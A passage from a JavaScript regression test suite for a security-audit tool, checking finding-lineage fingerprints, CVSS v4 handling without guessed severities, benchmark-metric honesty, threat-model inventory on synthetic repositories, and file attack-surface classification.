  if (zeroSarif.runs[0].properties.auditIntent !== 'REGRESSION' || !zeroSarif.runs[0].properties.canDeclareClean) {
    throw new Error('R2-P0-03 VIOLATION: SARIF run properties missing auditIntent or canDeclareClean');
  }
  const zeroMd = renderMarkdownFromCanonical({
    canonicalFindings: zeroCandidateRun.canonicalFindings,
    manifest: cleanManifest,
    coverageStatus: zeroCandidateRun.coverageStatus,
    repoRoot: process.cwd(),
    auditIntent: zeroCandidateRun.auditIntent
  });
  if (!zeroMd.includes('Audit Intent') || !zeroMd.includes('REGRESSION')) {
    throw new Error('R2-P0-03 VIOLATION: Markdown missing Audit Intent header');
  }

  // 67.7 validateDiscoveryMatrix validates arrays of cells fail-closed
  const validMultiMatrix = [
    validCell,
    { component: 'API', family: 'injection/query/template/eval', status: 'PENDING' },
    { component: 'FileHandling', family: 'filesystem/path/archive', status: 'NOT_APPLICABLE' }
  ];
  const matrixRes = validateDiscoveryMatrix(validMultiMatrix, process.cwd());
  if (!matrixRes.valid || matrixRes.totalCells !== 3) {
    throw new Error(`R2-P0-01 VIOLATION: valid discovery matrix rejected: ${matrixRes.error}`);
  }
  const invalidMultiMatrix = [validCell, invalidStatusCell];
  const invalidMatrixRes = validateDiscoveryMatrix(invalidMultiMatrix, process.cwd());
  if (invalidMatrixRes.valid) {
    throw new Error('R2-P0-01 VIOLATION: discovery matrix containing invalid cell accepted as valid');
  }

  // 67.8 Malformed discoveryMatrix strictly denies clean declaration (Finding 01 fix)
  const malformedMatrixRun = finalizeScan({
    candidates: [],
    manifest: cleanManifest,
    repoRoot: process.cwd(),
    discoveryMatrix: invalidMultiMatrix
  });
  if (malformedMatrixRun.summary.canDeclareClean || malformedMatrixRun.summary.discoveryMatrixValid) {
    throw new Error('R2-P0-01 VIOLATION: Scan with invalid discoveryMatrix allowed canDeclareClean: true');
  }

  console.log('✔ 67. R2-P0-01 / 02 / 03 Invariant: Zero-candidate discovery cell, Default-Deny claim model, and auditIntent convergence.');

  // 68. R2-P0-04 / 05 Invariant: Finding Lineage, Novelty state machine, and Fingerprint v2 line-shift invariance.
  // 68.1 Lineage fingerprint is line-shift invariant for same semantic vulnerability
  const lineageFpLine15 = computeLineageFingerprint({
    ruleId: 'CWE-89',
    uri: 'src/api.ts',
    component: 'Auth',
    family: 'injection/query/template/eval',
    symbol: 'findUserById'
  });
  const lineageFpLine120 = computeLineageFingerprint({
    ruleId: 'CWE-89',
    uri: 'src/api.ts',
    component: 'Auth',
    family: 'injection/query/template/eval',
    symbol: 'findUserById'
  });
  if (lineageFpLine15 !== lineageFpLine120) {
    throw new Error('R2-P0-05 VIOLATION: Lineage fingerprint changed when symbol and rule were identical');
  }

  // 68.2 Exact location fingerprint changes when line number shifts
  const locFp1 = computeFindingFingerprint('CWE-89', 'src/api.ts', 15);
  const locFp2 = computeFindingFingerprint('CWE-89', 'src/api.ts', 120);
  if (locFp1 === locFp2) {
    throw new Error('R2-P0-05 VIOLATION: Exact location fingerprint failed to distinguish different lines');
  }

  // 68.3 validateFindingLineage validates novelty states and rejects invalid ones
  const badNovelty = validateFindingLineage({ novelty: 'UNKNOWN_NOVELTY' });
  if (badNovelty.valid) {
    throw new Error('R2-P0-04 VIOLATION: validateFindingLineage accepted unrecognized novelty state');
  }

  // 68.4 validateFindingLineage enforces whyNow rationale on FIX_INTRODUCED and PREVIOUSLY_MISSED
  const missingWhyNow = validateFindingLineage({ novelty: 'FIX_INTRODUCED', whyNow: '' });
  if (missingWhyNow.valid) {
    throw new Error('R2-P0-04 VIOLATION: FIX_INTRODUCED accepted with missing whyNow rationale');
  }
  const validWhyNow = validateFindingLineage({
    novelty: 'FIX_INTRODUCED',
    whyNow: 'Patch introduced new dynamic parameter into SQL query'
  });
  if (!validWhyNow.valid || validWhyNow.lineage.novelty !== 'FIX_INTRODUCED') {
    throw new Error('R2-P0-04 VIOLATION: valid FIX_INTRODUCED with whyNow was rejected');
  }

  // 68.5 unionCandidates deduplicates findings across line shifts using semantic lineage
  const runShift1 = [
    {
      ruleId: 'CWE-89',
      location: { uri: 'src/api.ts', startLine: 15 },
      symbol: 'findUserById',
      title: 'SQLi Candidate'
    }
  ];
  const runShift2 = [
    {
      ruleId: 'CWE-89',
      location: { uri: 'src/api.ts', startLine: 25 }, // Shifted 10 lines down
      symbol: 'findUserById',
      title: 'SQLi Candidate shifted'
    }
  ];
  const unionedShift = unionCandidates([runShift1, runShift2], process.cwd(), { dedupeBy: 'lineage' });
  if (unionedShift.length !== 1 || unionedShift[0].recurrenceCount !== 2) {
    throw new Error(`R2-P0-05 VIOLATION: unionCandidates failed to deduplicate shifted finding by lineage: length=${unionedShift.length}`);
  }

  // 68.6 finalizeScan populates dual fingerprints and validates lineage metadata
  const lineageCandidate = {
    id: 'SEC-LIN-01',
    ruleId: 'CWE-89',
    title: 'SQL Injection in Query',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 },
    lineage: {
      novelty: 'NEW_SURFACE',
      whyNow: null
    }
  };
  const lineageScanRes = finalizeScan({
    candidates: [lineageCandidate],
    repoRoot: process.cwd()
  });
  const canonicalLin = lineageScanRes.canonicalFindings[0];
  if (!canonicalLin.locationFingerprint || !canonicalLin.lineageId || !canonicalLin.lineage) {
    throw new Error('R2-P0-04 VIOLATION: canonical finding missing locationFingerprint, lineageId, or lineage');
  }
  if (canonicalLin.lineage.novelty !== 'NEW_SURFACE') {
    throw new Error('R2-P0-04 VIOLATION: canonical finding lineage novelty not preserved');
  }

  // 68.7 SARIF and Markdown render dual fingerprints and lineage
  const linSarif = renderSarifFromCanonical({
    canonicalFindings: [canonicalLin],
    repoRoot: process.cwd()
  });
  if (!linSarif.runs[0].results[0].partialFingerprints.locationFingerprint ||
      !linSarif.runs[0].results[0].partialFingerprints.lineageFingerprint) {
    throw new Error('R2-P0-05 VIOLATION: SARIF result missing dual fingerprints');
  }
  const linMd = renderMarkdownFromCanonical({
    canonicalFindings: [canonicalLin],
    repoRoot: process.cwd()
  });
  if (!linMd.includes('Lineage ID') || !linMd.includes('NEW_SURFACE')) {
    throw new Error('R2-P0-04 VIOLATION: Markdown missing Lineage ID or novelty');
  }

  // 68.8 validateCanonicalFindings downgrades invalid lineage fail-closed to DEFERRED (Finding 01 fix)
  const canonicalWithBadLineage = [{
    id: 'SEC-BAD-LIN',
    ruleId: 'CWE-89',
    severity: 'HIGH',
    title: 'SQLi with fake novelty',
    disposition: 'REPORTABLE',
    verdict: 'CONFIRMED',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 },
    lineage: { novelty: 'BOGUS_NOVELTY' },
    consensus: { supports: 3, totalVotes: 3, refutes: 0, unanimous: true },
    rigor: { score: 0.9 }
  }];
  const validatedBadLin = validateCanonicalFindings(canonicalWithBadLineage, process.cwd());
  if (validatedBadLin[0].disposition !== 'DEFERRED' || validatedBadLin[0].verdict !== 'NEEDS_MANUAL_REVIEW') {
    throw new Error('R2-P0-04 VIOLATION: validateCanonicalFindings failed to downgrade finding with invalid lineage');
  }

  // 68.9 Forged lineageId on candidate ingress is discarded and calculated authoritatively (Finding 02 fix)
  const forgedCandidate = {
    id: 'SEC-FORGE-01',
    ruleId: 'CWE-89',
    title: 'Candidate with forged lineageId',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 },
    lineageId: 'FORGED_00000000000000000000000000'
  };
  const forgedScanRes = finalizeScan({
    candidates: [forgedCandidate],
    repoRoot: process.cwd()
  });
  if (forgedScanRes.canonicalFindings[0].lineageId === 'FORGED_00000000000000000000000000') {
    throw new Error('R2-P0-05 VIOLATION: finalizeScan accepted untrusted client self-asserted lineageId');
  }

  // 68.10 Intra-run candidate separation: two different lines without symbol in same run are NOT shadowed (Finding 04 fix)
  const intraRunCandidates = [
    { ruleId: 'CWE-89', location: { uri: 'src/api.ts', startLine: 15 }, title: 'SQLi Sink 1' },
    { ruleId: 'CWE-89', location: { uri: 'src/api.ts', startLine: 85 }, title: 'SQLi Sink 2' }
  ];
  const unionedIntra = unionCandidates([intraRunCandidates], process.cwd(), { dedupeBy: 'lineage' });
  if (unionedIntra.length !== 2) {
    throw new Error(`R2-P0-05 VIOLATION: unionCandidates shadowed distinct sinks without symbol: got ${unionedIntra.length}, expected 2`);
  }

  console.log('✔ 68. R2-P0-04 / 05 Invariant: Finding Lineage, Novelty state machine, and Fingerprint v2 line-shift invariance.');

  // 69. R2-P0-06 / 07 Invariant: CVSS v4.0 Base Metric Vector (no heuristic guesswork) & Evidence Sufficiency.
  // 69.1 Valid vector with score: null yields severity: 'UNRATED' without guessing
  const testVector = 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N';
  const cvssUnscored = validateCvssV4({ vector: testVector, score: null });
  if (!cvssUnscored.valid || cvssUnscored.score !== null || cvssUnscored.severity !== 'UNRATED') {
    throw new Error(`R2-P0-06 VIOLATION: Unscored CVSS vector assigned guessed severity: got ${cvssUnscored.severity}`);
  }

  // 69.2 Zero-impact vector yields NONE
  const zeroImpactVec = 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:N/SI:N/SA:N';
  const cvssZero = validateCvssV4({ vector: zeroImpactVec, score: null });
  if (!cvssZero.valid || cvssZero.severity !== 'NONE') {
    throw new Error(`R2-P0-06 VIOLATION: Zero-impact vector was not NONE: got ${cvssZero.severity}`);
  }

  // 69.3 finalizeScan does NOT fallback invalid CVSS to MEDIUM; yields UNRATED
  const invalidCvssScan = finalizeScan({
    candidates: [{
      id: 'SEC-BAD-CVSS-69',
      ruleId: 'CWE-89',
      title: 'Bad CVSS candidate',
      location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 },
      cvssV4: { vector: 'CVSS:4.0/AV:N/MALFORMED', score: 9.0 }
    }],
    repoRoot: process.cwd()
  });
  if (invalidCvssScan.canonicalFindings[0].severity !== 'UNRATED') {
    throw new Error(`R2-P0-06 VIOLATION: finalizeScan fell back invalid CVSS to ${invalidCvssScan.canonicalFindings[0].severity} instead of UNRATED`);
  }

  // 69.3b validateCanonicalFindings defaults missing severity to UNRATED (no MEDIUM fallback)
  const canonicalMissingSev = [{
    id: 'SEC-NO-SEV',
    ruleId: 'CWE-89',
    title: 'Finding without severity',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 }
  }];
  const validatedNoSev = validateCanonicalFindings(canonicalMissingSev, process.cwd());
  if (validatedNoSev[0].severity !== 'UNRATED') {
    throw new Error(`R2-P0-06 VIOLATION: validateCanonicalFindings fell back missing severity to ${validatedNoSev[0].severity} instead of UNRATED`);
  }

  // 69.4 mapSeverityToSarif('UNRATED', null) maps level warning and securitySeverity null
  const unratedSarifMapping = mapSeverityToSarif('UNRATED', null);
  if (unratedSarifMapping.level !== 'warning' || unratedSarifMapping.securitySeverity !== null) {
    throw new Error(`R2-P0-06 VIOLATION: mapSeverityToSarif for UNRATED fabricated score: ${JSON.stringify(unratedSarifMapping)}`);
  }

  // 69.5 calculateEvidenceSufficiency returns structured completeness heuristic with disclaimer
  const esResult = calculateEvidenceSufficiency({
    sourceVerified: true,
    sinkVerified: true,
    dataflowVerifiedSteps: 3,
    dataflowTotalSteps: 3,
    pocSyntacticDemonstrated: true,
    mitigationInspected: true
  });
  if (esResult.score !== 1.0 || esResult.sufficiencyLevel !== 'HIGH' || !esResult.disclaimer.includes('Internal heuristic')) {
    throw new Error('R2-P0-07 VIOLATION: calculateEvidenceSufficiency returned invalid completeness object or missing disclaimer');
  }

  // 69.6 deriveAuthoritativeEvidenceSufficiency produces valid completeness object
  const authEs = deriveAuthoritativeEvidenceSufficiency({
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 }
  }, [{
    findingId: 'SEC-TEST',
    decision: 'CONFIRMED',
    _validatedEvidence: [
      { path: 'skills/3lens/scripts/safe-git.mjs', line: 1, role: 'source' },
      { path: 'skills/3lens/scripts/safe-git.mjs', line: 1, role: 'sink' }
    ]
  }], process.cwd());
  if (authEs.score < 0.5 || !authEs.sourceVerified || !authEs.sinkVerified) {
    throw new Error('R2-P0-07 VIOLATION: deriveAuthoritativeEvidenceSufficiency failed to compute sufficiency from ballots');
  }

  // 69.7 Markdown rendering displays Evidence Sufficiency with internal heuristic label
  const mdEsFinding = {
    id: 'SEC-ES-01',
    ruleId: 'CWE-89',
    severity: 'HIGH',
    title: 'Evidence Sufficiency Test',
    disposition: 'REPORTABLE',
    verdict: 'CONFIRMED',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 },
    evidenceSufficiency: esResult,
    consensus: { supports: 3, totalVotes: 3, refutes: 0, unanimous: true }
  };
  const mdEsOutput = renderMarkdownFromCanonical({
    canonicalFindings: [mdEsFinding],
    repoRoot: process.cwd()
  });
  if (!mdEsOutput.includes('Evidence Sufficiency') || !mdEsOutput.includes('[Internal Heuristic]')) {
    throw new Error('R2-P0-07 VIOLATION: Markdown output missing Evidence Sufficiency header or [Internal Heuristic] tag');
  }

  console.log('✔ 69. R2-P0-06 / 07 Invariant: CVSS v4.0 Base Metric Vector (no heuristic guesswork) & Evidence Sufficiency.');

  // 70. R2-P0-08 Invariant: Benchmark Truthfulness, Real Discovery Evaluation, and Stochastic Stability.
  // 70.1 computeJaccardSimilarity computes intersection over union
  const setA = ['CWE-89:db.js', 'CWE-79:view.js'];
  const setB = ['CWE-79:view.js', 'CWE-22:file.js'];
  const jaccardSim = computeJaccardSimilarity(setA, setB); // 1 / 3 = 0.3333
  if (Math.abs(jaccardSim - 0.3333) > 0.001) {
    throw new Error(`R2-P0-08 VIOLATION: computeJaccardSimilarity failed: expected 0.3333, got ${jaccardSim}`);
  }

  // 70.2 evaluateDiscovery accurately scores candidates against ground truth
  const sampleTruth = [
    { id: 'T-01', cwe: 'CWE-89', file: 'src/db.js', targetLine: 10, expectedVerdict: 'VULNERABLE' },
    { id: 'T-02', cwe: 'CWE-79', file: 'src/xss.js', targetLine: 20, expectedVerdict: 'SAFE' }
  ];
  const sampleCandidates = [
    { ruleId: 'CWE-89', location: { uri: 'src/db.js', startLine: 10 } },
    { ruleId: 'CWE-79', location: { uri: 'src/xss.js', startLine: 20 } }
  ];
  const discRes = evaluateDiscovery(sampleCandidates, sampleTruth);
  if (discRes.candidateTP !== 1 || discRes.candidateFP !== 1 || discRes.candidateFN !== 0) {
    throw new Error(`R2-P0-08 VIOLATION: evaluateDiscovery metrics mismatch: TP=${discRes.candidateTP}, FP=${discRes.candidateFP}`);
  }

  // 70.2b evaluateDiscovery rejects empty URI and prevents duplicate TP inflation (Findings 1 & 2)
  const adversarialCandidates = [
    {}, // completely empty candidate
    { ruleId: 'CWE-89', location: { uri: '' } }, // blank URI
    { ruleId: 'CWE-89', location: { uri: 'src/db.js', startLine: 10 } }, // 1st legit TP
    { ruleId: 'CWE-89', location: { uri: 'src/db.js', startLine: 10 } }  // duplicate report on same site
  ];
  const advRes = evaluateDiscovery(adversarialCandidates, sampleTruth);
  if (advRes.candidateTP !== 1 || advRes.duplicateCandidateCount !== 1) {
    throw new Error(`R2-P0-08 VIOLATION: Empty URI matched or duplicate candidate inflated TP: TP=${advRes.candidateTP}, dups=${advRes.duplicateCandidateCount}`);
  }

  // 70.3 evaluateStability accurately computes multi-run metrics
  const mockRuns = [
    [{ ruleId: 'CWE-89', location: { uri: 'src/db.js', startLine: 10 }, symbol: 'f1' }],
    [{ ruleId: 'CWE-89', location: { uri: 'src/db.js', startLine: 25 }, symbol: 'f1' }] // line shift
  ];
  const stabRes = evaluateStability(mockRuns, process.cwd());
  if (stabRes.meanJaccardSimilarity !== 1.0 || stabRes.perfectRecurrenceCount !== 1) {
    throw new Error('R2-P0-08 VIOLATION: evaluateStability failed to recognize line-shift invariant lineage');
  }

  // 70.4 runSemanticEval outputs truthful disposition benchmark metrics
  const semResult = runSemanticEval(process.cwd(), 1);
  if (semResult.failed > 0 || semResult.total !== 20) {
    throw new Error('R2-P0-08 VIOLATION: runSemanticEval failed to pass 20 disposition ground-truth invariant cases');
  }

  console.log('✔ 70. R2-P0-08 Invariant: Benchmark Truthfulness, Real Discovery Evaluation, and Stochastic Stability.');

  // 71. R2-P0-09 / R2-P0-10 Invariant: Multi-Profile Threat Model & Granular Coverage Classification.
  // 71.1 detectRepositoryInventory detects multi-profile and multi-language facts
  const repoInv = detectRepositoryInventory(process.cwd());
  if (!repoInv.profiles.includes('agent-plugin') || !repoInv.languages.includes('JavaScript')) {
    throw new Error(`R2-P0-09 VIOLATION: detectRepositoryInventory missed agent-plugin or JavaScript: ${JSON.stringify(repoInv)}`);
  }
  if (!repoInv.entrypoints.some(e => e.path === 'plugin.json')) {
    throw new Error('R2-P0-09 VIOLATION: plugin.json entrypoint missing from inventory facts');
  }

  // 71.2 buildThreatModel produces evidence-bound components and grounds assumptions
  const fullTm = buildThreatModel(process.cwd());
  if (!fullTm.targetProfile || fullTm.targetProfile.primary !== 'agent-plugin') {
    throw new Error(`R2-P0-09 VIOLATION: Threat model primary profile mismatch: got ${fullTm.targetProfile?.primary}`);
  }
  const pluginComp = fullTm.components.find(c => c.name === 'PluginSystem');
  if (!pluginComp || !pluginComp.evidence || !pluginComp.evidence.path) {
    throw new Error('R2-P0-09 VIOLATION: PluginSystem component lacks verified evidence pointer');
  }
  const authActor = fullTm.actors.find(a => a.id === 'authenticated-user');
  if (!authActor || authActor.status !== 'ASSUMPTION') {
    throw new Error('R2-P0-09 VIOLATION: Unevidenced actor was not classified as ASSUMPTION');
  }

  // 71.3 categorizeDirectory implements granular coverage classifications without blanket test exclusions (R2-P0-10)
  const testCat = categorizeDirectory('test');
  if (testCat.status !== 'SCANNED_TEST_EXECUTABLE') {
    throw new Error(`R2-P0-10 VIOLATION: test directory blanket excluded: got ${testCat.status}`);
  }
  const githubCat = categorizeDirectory('.github');
  if (githubCat.status !== 'SCANNED_CI') {
    throw new Error(`R2-P0-10 VIOLATION: .github directory not classified as SCANNED_CI: got ${githubCat.status}`);
  }
  const agentCat = categorizeDirectory('agents');
  if (agentCat.status !== 'SCANNED_AGENT_CONTEXT') {
    throw new Error(`R2-P0-10 VIOLATION: agents directory not classified as SCANNED_AGENT_CONTEXT: got ${agentCat.status}`);
  }
  const cmakeCat = categorizeDirectory('cmake');
  if (cmakeCat.status !== 'SCANNED_BUILD') {
    throw new Error(`R2-P0-10 VIOLATION: cmake directory not classified as SCANNED_BUILD: got ${cmakeCat.status}`);
  }

  // 71.4 classifyFile classifies individual attack surfaces & prevents executable bypass in static/
  const fileCi = classifyFile('.github/workflows/ci.yml');
  const fileContext = classifyFile('rules/AGENTS.md');
  const fileTest = classifyFile('test/scanner.test.js');
  const fileBuild = classifyFile('package.json');
  const fileStaticMedia = classifyFile('static/images/logo.png');
  const fileStaticScript = classifyFile('static/scripts/exploit.js');
  if (fileCi.classification !== 'SCANNED_CI' ||
      fileContext.classification !== 'SCANNED_AGENT_CONTEXT' ||
      fileTest.classification !== 'SCANNED_TEST_EXECUTABLE' ||
      fileBuild.classification !== 'SCANNED_BUILD' ||
      fileStaticMedia.classification !== 'EXCLUDED_STATIC_ASSET' ||
      fileStaticMedia.isScanned !== false ||
      fileStaticScript.classification !== 'SCANNED_RUNTIME' ||
      fileStaticScript.isScanned !== true) {
    throw new Error(`R2-P0-10 VIOLATION: classifyFile returned incorrect attack surface categories or allowed executable script bypass in static directory`);
  }

  // 71.5 Synthetic Non-Node Repository Threat Model Validation (No Dangling Pointers)
  const syntheticTempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tm-audit-'));
  try {
    fs.mkdirSync(path.join(syntheticTempDir, 'handlers'), { recursive: true });
    fs.mkdirSync(path.join(syntheticTempDir, 'auth'), { recursive: true });
    fs.writeFileSync(path.join(syntheticTempDir, 'main.go'), 'package main', 'utf8');

    const synthTm = buildThreatModel(syntheticTempDir);
    const synthApi = synthTm.components.find(c => c.name === 'API');
    if (!synthApi || synthApi.evidence.path !== 'handlers/') {
      throw new Error(`R2-P0-09 VIOLATION: API component in Go repo had dangling or incorrect evidence path: ${JSON.stringify(synthApi)}`);
    }
    const synthAuth = synthTm.components.find(c => c.name === 'Auth');
    if (!synthAuth || synthAuth.evidence.path !== 'auth/' || synthAuth.evidence.manifestOrigin === 'package.json:dependencies') {
      throw new Error(`R2-P0-09 VIOLATION: Auth component in Go repo fabricated package.json evidence: ${JSON.stringify(synthAuth)}`);
    }
    const synthOperator = synthTm.actors.find(a => a.id === 'system-operator');
    if (!synthOperator || synthOperator.status !== 'ASSUMPTION' || synthOperator.evidence !== null) {
      throw new Error(`R2-P0-09 VIOLATION: system-operator claimed FACT in repo without CI: ${JSON.stringify(synthOperator)}`);
    }
  } finally {
    fs.rmSync(syntheticTempDir, { recursive: true, force: true });
  }

  // 71.6 Path B regression: a Visual Studio solution is not evidence of C#/web by itself.
  // Physical native artifacts must drive language/profile/runtime classification.
  const nativeTempDir71 = fs.mkdtempSync(path.join(os.tmpdir(), 'tm-native-path-b-'));
  try {
    const nativeProjectDir = path.join(nativeTempDir71, 'src', 'apps', 'mpc-hc');
    fs.mkdirSync(nativeProjectDir, { recursive: true });
    fs.writeFileSync(path.join(nativeTempDir71, 'mpc-hc.sln'), [
      'Microsoft Visual Studio Solution File, Format Version 12.00',
      'Project("{00000000-0000-0000-0000-000000000000}") = "mpc-hc", "src\\apps\\mpc-hc\\mpc-hc.vcxproj", "{11111111-1111-1111-1111-111111111111}"',
      'EndProject'
    ].join('\n'), 'utf8');
    fs.writeFileSync(path.join(nativeProjectDir, 'mpc-hc.vcxproj'), '<Project><ItemGroup><ClCompile Include="WebClientSocket.cpp" /></ItemGroup></Project>', 'utf8');
    fs.writeFileSync(path.join(nativeProjectDir, 'mpc-hc.vcxproj.filters'), '<Project />', 'utf8');
    fs.writeFileSync(path.join(nativeProjectDir, 'WebClientSocket.cpp'), '#include "WebClientSocket.h"\nint parse_packet(const char* p) { return p ? 0 : -1; }\n', 'utf8');
    fs.writeFileSync(path.join(nativeProjectDir, 'WebClientSocket.h'), '#pragma once\nint parse_packet(const char* p);\n', 'utf8');
    fs.writeFileSync(path.join(nativeProjectDir, 'meson.build'), `project('mpc-hc-native', 'cpp')\n`, 'utf8');

    const nativeInv71 = detectRepositoryInventory(nativeTempDir71);
    if (!nativeInv71.languages.includes('C/C++') ||
        !nativeInv71.profiles.includes('native') ||
        nativeInv71.primaryProfile !== 'native' ||
        nativeInv71.languages.includes('C#') ||
        nativeInv71.profiles.includes('web-app')) {
      throw new Error(`PATH-B VIOLATION: native Visual Studio solution misclassified: ${JSON.stringify(nativeInv71)}`);
    }
    if (!nativeInv71.manifests.some(m => m.path === 'src/apps/mpc-hc/mpc-hc.vcxproj' && m.type === 'visual-cpp-project') ||
        !nativeInv71.manifests.some(m => m.path === 'src/apps/mpc-hc/meson.build' && m.type === 'meson')) {
      throw new Error(`PATH-B VIOLATION: deep native build manifests were not inventoried: ${JSON.stringify(nativeInv71.manifests)}`);
    }

    const nativeContextRes71 = initProjectContext(nativeTempDir71);
    if (!nativeContextRes71.success) {
      throw new Error(`PATH-B VIOLATION: initProjectContext failed for native fixture: ${JSON.stringify(nativeContextRes71)}`);
    }
    const nativeProject71 = JSON.parse(fs.readFileSync(path.join(nativeTempDir71, '.security-audit', 'project.json'), 'utf8'));
    if (nativeProject71.projectType !== 'native' ||
        nativeProject71.framework !== 'Native C/C++ Application / Library' ||
        !nativeProject71.languages.includes('C/C++') ||
        !nativeProject71.runtime.includes('Native / C++ (MSVC/Clang/GCC)') ||
        nativeProject71.runtime.includes('.NET Framework / IIS')) {
      throw new Error(`PATH-B VIOLATION: native Project Security Context was misclassified: ${JSON.stringify(nativeProject71)}`);
    }
  } finally {
    fs.rmSync(nativeTempDir71, { recursive: true, force: true });
  }

  // 71.7 A desktop C# solution is C# only when .csproj/.cs evidence exists, and
  // it must not become web-app without explicit ASP.NET/web artifacts.
  const csharpTempDir71 = fs.mkdtempSync(path.join(os.tmpdir(), 'tm-csharp-desktop-'));
  try {
    fs.mkdirSync(path.join(csharpTempDir71, 'src'), { recursive: true });
    fs.writeFileSync(path.join(csharpTempDir71, 'desktop.sln'), [
      'Microsoft Visual Studio Solution File, Format Version 12.00',
      'Project("{00000000-0000-0000-0000-000000000000}") = "Desktop", "src\\Desktop.csproj", "{22222222-2222-2222-2222-222222222222}"',
      'EndProject'
    ].join('\n'), 'utf8');
    fs.writeFileSync(path.join(csharpTempDir71, 'src', 'Desktop.csproj'), '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><OutputType>WinExe</OutputType></PropertyGroup></Project>', 'utf8');
    fs.writeFileSync(path.join(csharpTempDir71, 'src', 'Program.cs'), 'class Program { static void Main() {} }', 'utf8');
    const csharpInv71 = detectRepositoryInventory(csharpTempDir71);
    if (!csharpInv71.languages.includes('C#') || csharpInv71.profiles.includes('web-app')) {
      throw new Error(`PATH-B VIOLATION: desktop C# solution was not evidence-bound or was falsely classified web-app: ${JSON.stringify(csharpInv71)}`);
    }
  } finally {
    fs.rmSync(csharpTempDir71, { recursive: true, force: true });
  }

  // 71.8 A .sln reference that lexically stays inside the repository but resolves
  // through a symlink to an external native project must not become architecture evidence.
  const nativeSymlinkRoot71 = fs.mkdtempSync(path.join(os.tmpdir(), 'tm-native-sln-symlink-'));
  try {
    const repo71 = path.join(nativeSymlinkRoot71, 'repo');
    const outside71 = path.join(nativeSymlinkRoot71, 'outside');
    fs.mkdirSync(path.join(repo71, 'src'), { recursive: true });
    fs.mkdirSync(outside71, { recursive: true });
    fs.writeFileSync(path.join(outside71, 'external.vcxproj'), '<Project />', 'utf8');
    fs.writeFileSync(path.join(repo71, 'escape.sln'), [
      'Microsoft Visual Studio Solution File, Format Version 12.00',
      'Project("{00000000-0000-0000-0000-000000000000}") = "External", "src\\external.vcxproj", "{33333333-3333-3333-3333-333333333333}"',
      'EndProject'
    ].join('\n'), 'utf8');

    const link71 = path.join(repo71, 'src', 'external.vcxproj');
    let symlinkCreated71 = true;
    try {
      fs.symlinkSync(path.join('..', '..', 'outside', 'external.vcxproj'), link71, 'file');
    } catch {
      symlinkCreated71 = false;
    }

    if (symlinkCreated71) {
      const symlinkInv71 = detectRepositoryInventory(repo71);
      if (symlinkInv71.languages.includes('C/C++') || symlinkInv71.profiles.includes('native') ||
          symlinkInv71.manifests.some(m => m.path === 'src/external.vcxproj')) {
        throw new Error(`PATH-B VIOLATION: .sln project reference escaped repository through symlink: ${JSON.stringify(symlinkInv71)}`);
      }
    }
  } finally {
    fs.rmSync(nativeSymlinkRoot71, { recursive: true, force: true });
  }

  // 71.9 Repository-root aliases must not corrupt canonical relative manifest paths.
  // This reproduces macOS /var -> /private/var behavior using a synthetic symlink root.
  const nativeRootAliasBase71 = fs.mkdtempSync(path.join(os.tmpdir(), 'tm-native-root-alias-'));
  try {
    const realRepo71 = path.join(nativeRootAliasBase71, 'real-repo');
    const aliasRepo71 = path.join(nativeRootAliasBase71, 'repo-alias');
    const nativeDir71 = path.join(realRepo71, 'src', 'native');
    fs.mkdirSync(nativeDir71, { recursive: true });
    fs.writeFileSync(path.join(nativeDir71, 'player.vcxproj'), '<Project />', 'utf8');
    fs.writeFileSync(path.join(nativeDir71, 'player.cpp'), 'int main() { return 0; }\n', 'utf8');

    let rootAliasCreated71 = true;
    try {
      fs.symlinkSync(realRepo71, aliasRepo71, 'dir');
    } catch {
      rootAliasCreated71 = false;
    }

    if (rootAliasCreated71) {
      const aliasInv71 = detectRepositoryInventory(aliasRepo71);
      if (!aliasInv71.manifests.some(m => m.path === 'src/native/player.vcxproj' && m.type === 'visual-cpp-project') ||
          aliasInv71.manifests.some(m => m.path.startsWith('../') || path.isAbsolute(m.path))) {
        throw new Error(`PATH-B VIOLATION: canonical root alias corrupted relative manifest paths: ${JSON.stringify(aliasInv71.manifests)}`);
      }
    }
  } finally {
    fs.rmSync(nativeRootAliasBase71, { recursive: true, force: true });
  }

  console.log('✔ 71. R2-P0-09 / 10 Invariant: Multi-Profile Threat Model, native Path B classification, and Granular Coverage Classification.');

  // 72. R2-P0-11 / R2-P0-12 Invariant: Finding Type & Safe Proof Policy
  // 72.1 validateFindingType validates types and infers hardening/informational without misclassifying information disclosure
  const ftVuln = validateFindingType('VULNERABILITY');
  const ftHard = validateFindingType(null, 'CWE-hardening', 'Stricter CSP header');
  const ftInfo = validateFindingType('informational');
  const ftDefault = validateFindingType('UNKNOWN_GARBAGE');
  const ftInfoDisclosure = validateFindingType(null, 'CWE-200', 'Sensitive Information Disclosure in API');
  if (ftVuln.findingType !== 'VULNERABILITY' ||
      ftHard.findingType !== 'HARDENING' ||
      ftInfo.findingType !== 'INFORMATIONAL' ||
      ftDefault.findingType !== 'VULNERABILITY' ||
      ftInfoDisclosure.findingType !== 'VULNERABILITY') {
    throw new Error('R2-P0-11 VIOLATION: validateFindingType returned incorrect categories or misclassified information disclosure');
  }

  // 72.2 Hardening cannot be elevated to CRITICAL/HIGH vulnerability
  const hardeningCandidate = {
    id: 'SEC-HARD-01',
    ruleId: 'SEC-DEFENSE-IN-DEPTH',
    title: 'Proactive Rate Limiting Improvement',
    description: 'Improve rate limiting',
    findingType: 'HARDENING',
    severity: 'CRITICAL',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 }
  };
  const validatedHardening = validateCanonicalFindings([hardeningCandidate], process.cwd());
  if (validatedHardening[0].severity !== 'LOW') {
    throw new Error(`R2-P0-11 VIOLATION: Hardening finding elevated to CRITICAL/HIGH was not capped to LOW: got ${validatedHardening[0].severity}`);
  }

